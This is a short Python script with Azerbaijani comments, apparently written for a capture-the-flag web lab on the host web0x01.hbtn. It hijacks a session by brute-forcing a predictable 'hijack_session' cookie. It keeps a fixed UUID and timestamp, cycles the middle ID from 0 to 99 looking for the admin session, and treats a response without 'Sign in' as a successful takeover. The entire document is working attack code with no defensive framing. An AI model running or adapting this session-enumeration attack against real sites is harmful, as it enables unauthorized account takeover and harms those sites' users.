import requests

# Hədəf URL
url = "http://web0x01.hbtn/a1/hijack_session"

# Sizin sabit hissələr (Şəkillərdən götürdüm)
# DİQQƏT: Öz brauzerinizdəki ən son 'hijack_session' cookie-dən 
# '3f87...' ilə başlayan hissəni dəqiqləşdirin, eyni qalıbsa bunu işlədin.
uuid_part = "3f877254-08c4-4e14-8bc" 
timestamp_part = "17686664075" # Sonuncu timestamp-i saxlayaq, server yəqin ki, yoxlamır

print("--- Hücum Başladı ---")

# 1. Strategiya: İlk yaranan sessiyaları yoxlayaq (0-dan 100-ə qədər)
# Çünki Admin adətən ID 0 və ya 1 olur.
for i in range(100):
    # Cookie formatını düzəldirik: UUID-ID-TIMESTAMP
    cookie_value = f"{uuid_part}-{i}-{timestamp_part}"
    
    cookies = {'hijack_session': cookie_value}
    
    try:
        response = requests.get(url, cookies=cookies)
        
        # Əgər səhifədə "Sign in" yazısı YOXDURSA, deməli içəridəyik!
        # (Və ya "Flag" sözü varsa)
        if "Sign in" not in response.text:
            print(f"[+] UĞURLU! ID Tapıldı: {i}")
            print(f"Cookie: {cookie_value}")
            print("-" * 30)
            # Flag-i tapmaq üçün response.text-i ekrana basa bilərik
            # print(response.text) 
            break
        else:
            print(f"[-] ID {i} uğursuz...", end="\r")
            
    except Exception as e:
        print(f"Xəta: {e}")

print("\n--- Yoxlama bitdi ---")
